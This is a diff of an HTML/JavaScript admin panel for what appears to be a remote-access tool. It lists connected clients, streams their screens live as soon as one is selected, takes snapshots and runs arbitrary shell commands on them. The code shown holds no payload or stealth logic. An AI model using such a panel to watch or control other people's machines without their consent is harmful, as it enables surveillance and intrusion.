@@ -1,205 +1,538 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <title>GloryVN Admin Panel</title>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');
 
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #0f172a;
-            color: white;
-            display: flex;
-            height: 100vh;
-        }
+  :root {
+    --bg:       #080b10;
+    --surface:  #0d1117;
+    --border:   #1a2233;
+    --accent:   #00e5ff;
+    --accent2:  #ff3366;
+    --green:    #00ff88;
+    --muted:    #3d4f66;
+    --text:     #c9d8ef;
+    --mono:     'JetBrains Mono', monospace;
+    --sans:     'Syne', sans-serif;
+  }
 
-        /* Sidebar */
-        .sidebar {
-            width: 250px;
-            background-color: #111827;
-            padding: 20px;
-            border-right: 1px solid #1f2937;
-        }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
 
-        .sidebar h2 {
-            margin-top: 0;
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    height: 100vh;
+    display: flex;
+    overflow: hidden;
+  }
 
-        .client {
-            padding: 10px;
-            background-color: #1f2937;
-            margin-bottom: 8px;
-            cursor: pointer;
-            border-radius: 6px;
-            transition: 0.2s;
-        }
+  /* SIDEBAR */
+  .sidebar {
+    width: 220px;
+    min-width: 220px;
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+  }
 
-        .client:hover {
-            background-color: #374151;
-        }
+  .sidebar-header {
+    padding: 18px 16px 14px;
+    border-bottom: 1px solid var(--border);
+  }
 
-        .client.active {
-            background-color: #2563eb;
-        }
+  .logo {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: 15px;
+    letter-spacing: 0.05em;
+    color: var(--accent);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
 
-        /* Main */
-        .main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
+  .logo-dot {
+    width: 8px; height: 8px;
+    background: var(--accent);
+    border-radius: 50%;
+    box-shadow: 0 0 8px var(--accent);
+    animation: pulse 2s infinite;
+  }
 
-        .topbar {
-            padding: 15px;
-            border-bottom: 1px solid #1f2937;
-            display: flex;
-            gap: 10px;
-        }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.4; transform: scale(0.6); }
+  }
 
-        button {
-            padding: 8px 14px;
-            background-color: #2563eb;
-            border: none;
-            color: white;
-            border-radius: 6px;
-            cursor: pointer;
-        }
+  .clients-label {
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-top: 14px;
+  }
 
-        button:hover {
-            background-color: #1d4ed8;
-        }
+  .client-list {
+    flex: 1;
+    overflow-y: auto;
+    padding: 10px;
+  }
 
-        input {
-            padding: 8px;
-            border-radius: 6px;
-            border: none;
-            outline: none;
-            width: 250px;
-        }
+  .client-list::-webkit-scrollbar { width: 3px; }
+  .client-list::-webkit-scrollbar-thumb { background: var(--border); }
 
-        .viewer {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #0b1220;
-        }
+  .client-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    border: 1px solid transparent;
+    margin-bottom: 4px;
+    transition: background 0.12s, border-color 0.12s;
+  }
 
-        img {
-            max-width: 95%;
-            max-height: 95%;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
+  .client-item:hover { background: #111a28; }
+  .client-item.active { background: #0a1929; border-color: var(--accent); }
 
-        .status {
-            font-size: 13px;
-            opacity: 0.6;
-        }
-    </style>
+  .client-dot {
+    width: 7px; height: 7px;
+    background: var(--green);
+    border-radius: 50%;
+    box-shadow: 0 0 6px var(--green);
+    flex-shrink: 0;
+  }
+
+  .client-id {
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  .no-clients {
+    color: var(--muted);
+    font-size: 12px;
+    text-align: center;
+    padding: 20px 0;
+  }
+
+  /* MAIN */
+  .main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* TOPBAR */
+  .topbar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+    flex-shrink: 0;
+  }
+
+  .btn {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 600;
+    padding: 7px 14px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    cursor: pointer;
+    background: transparent;
+    color: var(--text);
+    transition: all 0.12s;
+    white-space: nowrap;
+  }
+
+  .btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  .btn.primary { background: var(--accent); border-color: var(--accent); color: #000; }
+  .btn.primary:hover { opacity: 0.85; }
+
+  .btn.stream-active { background: rgba(0,255,136,0.1); border-color: var(--green); color: var(--green); }
+
+  .cmd-input {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: #0a1120;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 7px 12px;
+    color: var(--text);
+    outline: none;
+    flex: 1;
+    max-width: 340px;
+    transition: border 0.12s;
+  }
+  .cmd-input:focus { border-color: var(--accent); }
+  .cmd-input::placeholder { color: var(--muted); }
+
+  .divider { width: 1px; height: 20px; background: var(--border); margin: 0 2px; }
+
+  .stream-stats { display: flex; gap: 8px; align-items: center; }
+
+  .stat-badge {
+    background: #0d1a2a;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 3px 10px;
+    font-size: 11px;
+    font-weight: 600;
+    min-width: 64px;
+    text-align: center;
+    color: var(--muted);
+    transition: color 0.3s, border-color 0.3s;
+  }
+  .stat-badge.good { color: var(--green); border-color: rgba(0,255,136,0.3); }
+  .stat-badge.mid  { color: #ffbb00; border-color: rgba(255,187,0,0.3); }
+  .stat-badge.low  { color: var(--accent2); border-color: rgba(255,51,102,0.3); }
+
+  .status-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--muted);
+    margin-left: auto;
+  }
+
+  .status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--muted); }
+  .status-dot.on { background: var(--green); box-shadow: 0 0 5px var(--green); }
+
+  /* VIEWER */
+  .viewer {
+    flex: 1;
+    background: #04070d;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .screen-img {
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+    display: none;
+    border-radius: 3px;
+  }
+  .screen-img.show { display: block; }
+
+  .placeholder {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    color: var(--muted);
+  }
+  .ph-icon { font-size: 44px; opacity: 0.25; }
+  .ph-text { font-family: var(--sans); font-size: 13px; letter-spacing: 0.06em; }
+
+  .live-badge {
+    position: absolute;
+    top: 12px; left: 12px;
+    display: none;
+    align-items: center;
+    gap: 6px;
+    background: rgba(0,0,0,0.65);
+    border: 1px solid rgba(0,255,136,0.35);
+    border-radius: 20px;
+    padding: 4px 12px 4px 8px;
+    font-size: 11px;
+    color: var(--green);
+    font-weight: 700;
+    backdrop-filter: blur(6px);
+    letter-spacing: 0.08em;
+  }
+  .live-badge.show { display: flex; }
+  .rec { width: 7px; height: 7px; background: var(--green); border-radius: 50%; animation: blink 1s step-end infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* OUTPUT */
+  .output-panel {
+    height: 150px;
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    padding: 10px 14px;
+    overflow-y: auto;
+    font-size: 11.5px;
+    line-height: 1.65;
+    flex-shrink: 0;
+  }
+  .output-panel::-webkit-scrollbar { width: 3px; }
+  .output-panel::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .log { color: #5a7a99; }
+  .log.info   { color: var(--accent); }
+  .log.result { color: var(--green); }
+  .log.error  { color: var(--accent2); }
+  .log.ts     { color: var(--muted); font-size: 10px; }
+</style>
 </head>
 <body>
 
 <div class="sidebar">
-    <h2>Clients Online</h2>
-    <div id="clientList"></div>
+  <div class="sidebar-header">
+    <div class="logo"><span class="logo-dot"></span>CTRL PANEL</div>
+    <div class="clients-label">Online Clients</div>
+  </div>
+  <div class="client-list" id="clientList">
+    <div class="no-clients">No clients online</div>
+  </div>
 </div>
 
 <div class="main">
-    <div class="topbar">
-        <button onclick="requestScreenshot()">📸 Screenshot</button>
-
-        <input type="text" id="commandInput" placeholder="Nhập command...">
-        <button onclick="sendCommand()">🚀 Send</button>
-
-        <div class="status" id="status">Disconnected</div>
+  <div class="topbar">
+    <button class="btn primary" id="streamBtn" onclick="toggleStream()">▶ Live Stream</button>
+    <button class="btn" onclick="requestScreenshot()">⎙ Snapshot</button>
+    <div class="divider"></div>
+    <input class="cmd-input" id="cmdInput" placeholder="Shell command…"
+           onkeydown="if(event.key==='Enter')sendCommand()">
+    <button class="btn" onclick="sendCommand()">Run</button>
+    <div class="divider"></div>
+    <div class="stream-stats">
+      <div class="stat-badge" id="fpsBadge">-- FPS</div>
+      <div class="stat-badge" id="latBadge">-- ms</div>
     </div>
-
-    <div class="viewer">
-        <img id="screen" src="">
+    <div class="status-pill">
+      <div class="status-dot" id="statusDot"></div>
+      <span id="statusText">Connecting…</span>
     </div>
+  </div>
+
+  <div class="viewer">
+    <div class="placeholder" id="placeholder">
+      <div class="ph-icon">🖥</div>
+      <div class="ph-text">Select a client to begin</div>
+    </div>
+    <img class="screen-img" id="screenImg" alt="">
+    <div class="live-badge" id="liveBadge"><div class="rec"></div>LIVE</div>
+  </div>
+
+  <div class="output-panel" id="output">
+    <div class="log info">[SYSTEM] Panel ready</div>
+  </div>
 </div>
 
 <script>
-    let selectedClient = null;
-    const ws = new WebSocket(
-        (location.protocol === "https:" ? "wss://" : "ws://")
-        + location.host + "/ws/admin"
-    );
+  let selectedClient = null;
+  let isStreaming     = false;
+  let frameCount      = 0;
+  let fpsTimer        = null;
+  let lastFrameTime   = 0;
 
+  const ws = new WebSocket(
+    (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws/admin'
+  );
 
-    const clientListDiv = document.getElementById("clientList");
-    const screenImg = document.getElementById("screen");
-    const statusText = document.getElementById("status");
+  const $clientList = document.getElementById('clientList');
+  const $screenImg  = document.getElementById('screenImg');
+  const $ph         = document.getElementById('placeholder');
+  const $statusDot  = document.getElementById('statusDot');
+  const $statusTxt  = document.getElementById('statusText');
+  const $streamBtn  = document.getElementById('streamBtn');
+  const $liveBadge  = document.getElementById('liveBadge');
+  const $fpsBadge   = document.getElementById('fpsBadge');
+  const $latBadge   = document.getElementById('latBadge');
+  const $output     = document.getElementById('output');
 
-    ws.onopen = () => {
-        statusText.innerText = "Connected";
-    };
+  ws.onopen = () => {
+    $statusDot.classList.add('on');
+    $statusTxt.textContent = 'Connected';
+    log('WebSocket connected', 'info');
+  };
 
-    ws.onclose = () => {
-        statusText.innerText = "Disconnected";
-    };
+  ws.onclose = () => {
+    $statusDot.classList.remove('on');
+    $statusTxt.textContent = 'Disconnected';
+    _stopStream(false);
+    log('WebSocket disconnected', 'error');
+  };
 
-    ws.onmessage = (event) => {
-        const data = JSON.parse(event.data);
+  ws.onmessage = ({ data }) => {
+    let msg;
+    try { msg = JSON.parse(data); } catch { return; }
 
-        if (data.type === "clients") {
-            renderClients(data.clients);
-        }
+    const { type, client_id } = msg;
 
-        if (data.type === "screenshot") {
-            if (data.client_id === selectedClient) {
-                screenImg.src = "data:image/jpeg;base64," + data.image;
-            }
-        }
-    };
-
-    function renderClients(clients) {
-        clientListDiv.innerHTML = "";
-
-        clients.forEach(id => {
-            const div = document.createElement("div");
-            div.className = "client";
-            div.innerText = id;
-
-            div.onclick = () => {
-                document.querySelectorAll(".client")
-                    .forEach(c => c.classList.remove("active"));
-
-                div.classList.add("active");
-                selectedClient = id;
-            };
-
-            clientListDiv.appendChild(div);
-        });
+    if (type === 'clients') {
+      renderClients(msg.clients);
+      return;
     }
 
-    function requestScreenshot() {
-        if (!selectedClient) return alert("Chọn client trước!");
-
-        ws.send(JSON.stringify({
-            type: "request_screenshot",
-            client_id: selectedClient
-        }));
+    if (type === 'client_info' && client_id === selectedClient) {
+      const s = msg.sysinfo || {};
+      log(`[#${client_id}] ${s.platform} | CPU ${s.cpu_percent}% | RAM ${s.memory_percent}%`, 'info');
+      return;
     }
 
-    function sendCommand() {
-        if (!selectedClient) return alert("Chọn client trước!");
-
-        const cmd = document.getElementById("commandInput").value;
-
-        ws.send(JSON.stringify({
-            type: "command",
-            client_id: selectedClient,
-            command: cmd
-        }));
-
-        document.getElementById("commandInput").value = "";
+    if (type === 'stream_frame' && client_id === selectedClient) {
+      const now = performance.now();
+      if (lastFrameTime) {
+        $latBadge.textContent = Math.round(now - lastFrameTime) + ' ms';
+      }
+      lastFrameTime = now;
+      frameCount++;
+      $screenImg.src = 'data:image/jpeg;base64,' + msg.image;
+      showScreen();
+      return;
     }
+
+    if (type === 'screenshot' && client_id === selectedClient) {
+      $screenImg.src = 'data:image/jpeg;base64,' + msg.image;
+      showScreen();
+      log(`[#${client_id}] Snapshot received`, 'info');
+      return;
+    }
+
+    if (type === 'command_result' && client_id === selectedClient) {
+      log(msg.output, 'result');
+      return;
+    }
+
+    if (type === 'stream_stopped' && client_id === selectedClient) {
+      _stopStream(false);
+      log(`[#${client_id}] Stream stopped: ${msg.reason}`, 'error');
+      return;
+    }
+  };
+
+  // ── Client list ───────────────────────────────────────────
+  function renderClients(clients) {
+    if (!clients.length) {
+      $clientList.innerHTML = '<div class="no-clients">No clients online</div>';
+      if (selectedClient) { selectedClient = null; _stopStream(false); hideScreen(); }
+      return;
+    }
+
+    $clientList.innerHTML = '';
+    clients.forEach(id => {
+      const div = document.createElement('div');
+      div.className = 'client-item' + (id === selectedClient ? ' active' : '');
+      div.innerHTML = `<div class="client-dot"></div><div class="client-id">#${id}</div>`;
+      div.onclick = () => selectClient(id);
+      $clientList.appendChild(div);
+    });
+  }
+
+  function selectClient(id) {
+    if (id === selectedClient) return;
+
+    // Stop stream trên client cũ
+    if (isStreaming && selectedClient) {
+      ws.send(JSON.stringify({ type: 'stop_stream', client_id: selectedClient }));
+      isStreaming = false;
+    }
+
+    selectedClient = id;
+
+    document.querySelectorAll('.client-item').forEach(el => {
+      el.classList.toggle('active', el.querySelector('.client-id').textContent === '#' + id);
+    });
+
+    log(`[SELECTED] #${id}`, 'info');
+    startStream(); // auto-stream khi chọn client
+  }
+
+  // ── Stream ────────────────────────────────────────────────
+  function toggleStream() {
+    if (isStreaming) _stopStream(true);
+    else startStream();
+  }
+
+  function startStream() {
+    if (!selectedClient) { log('Select a client first', 'error'); return; }
+    if (isStreaming) return;
+
+    ws.send(JSON.stringify({ type: 'start_stream', client_id: selectedClient }));
+    isStreaming   = true;
+    frameCount    = 0;
+    lastFrameTime = 0;
+
+    $streamBtn.textContent = '⏹ Stop Stream';
+    $streamBtn.className = 'btn stream-active';
+    $liveBadge.classList.add('show');
+
+    // FPS counter — cập nhật mỗi giây
+    fpsTimer = setInterval(() => {
+      const fps = frameCount;
+      frameCount = 0;
+      $fpsBadge.textContent = fps + ' FPS';
+      $fpsBadge.className = 'stat-badge ' + (fps >= 15 ? 'good' : fps >= 8 ? 'mid' : 'low');
+    }, 1000);
+
+    log(`[STREAM] Started → #${selectedClient}`, 'info');
+  }
+
+  function _stopStream(sendMsg) {
+    if (sendMsg && selectedClient) {
+      try { ws.send(JSON.stringify({ type: 'stop_stream', client_id: selectedClient })); } catch {}
+    }
+    isStreaming = false;
+    clearInterval(fpsTimer);
+    fpsTimer = null;
+    frameCount = 0;
+
+    $streamBtn.textContent = '▶ Live Stream';
+    $streamBtn.className = 'btn primary';
+    $liveBadge.classList.remove('show');
+    $fpsBadge.textContent = '-- FPS';
+    $fpsBadge.className = 'stat-badge';
+    $latBadge.textContent = '-- ms';
+  }
+
+  // ── Actions ───────────────────────────────────────────────
+  function requestScreenshot() {
+    if (!selectedClient) { log('Select a client first', 'error'); return; }
+    ws.send(JSON.stringify({ type: 'request_screenshot', client_id: selectedClient }));
+  }
+
+  function sendCommand() {
+    if (!selectedClient) { log('Select a client first', 'error'); return; }
+    const cmd = document.getElementById('cmdInput').value.trim();
+    if (!cmd) return;
+    ws.send(JSON.stringify({ type: 'command', client_id: selectedClient, command: cmd }));
+    log('$ ' + cmd, 'log');
+    document.getElementById('cmdInput').value = '';
+  }
+
+  // ── UI ────────────────────────────────────────────────────
+  function showScreen() {
+    $screenImg.classList.add('show');
+    $ph.style.display = 'none';
+  }
+
+  function hideScreen() {
+    $screenImg.classList.remove('show');
+    $ph.style.display = 'flex';
+  }
+
+  function log(msg, cls = '') {
+    const ts = document.createElement('div');
+    ts.className = 'log ts';
+    ts.textContent = new Date().toLocaleTimeString();
+
+    const el = document.createElement('div');
+    el.className = 'log ' + cls;
+    el.textContent = msg;
+
+    $output.append(ts, el);
+    $output.scrollTop = $output.scrollHeight;
+
+    // Trim log
+    while ($output.children.length > 300) $output.removeChild($output.firstChild);
+  }
 </script>
-
 </body>
 </html>
